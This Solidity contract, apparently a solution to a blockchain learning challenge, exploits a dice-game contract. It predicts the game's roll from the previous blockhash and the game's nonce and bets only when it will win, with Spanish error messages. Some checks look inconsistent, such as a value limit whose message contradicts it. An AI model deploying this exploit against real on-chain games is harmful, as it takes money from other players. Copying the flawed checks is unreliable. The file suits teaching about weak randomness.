pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance > 0, "No hay premio que retirar");
        require(
            address(this).balance >= _amount,
            "El retiro es mayor que la cantidad del premio"
        );

        payable(_addr).transfer(_amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public payable {
        require(
            address(this).balance >= .002 ether,
            "El contrato no tiene fondos para transferir a DiceGame contract"
        );
        require(
            msg.value < 0.02 ether,
            "Fondos insuficientes para tirar los dados"
        );

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce)
        );
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "Rigged Roll:", roll);

        if (roll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert();
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}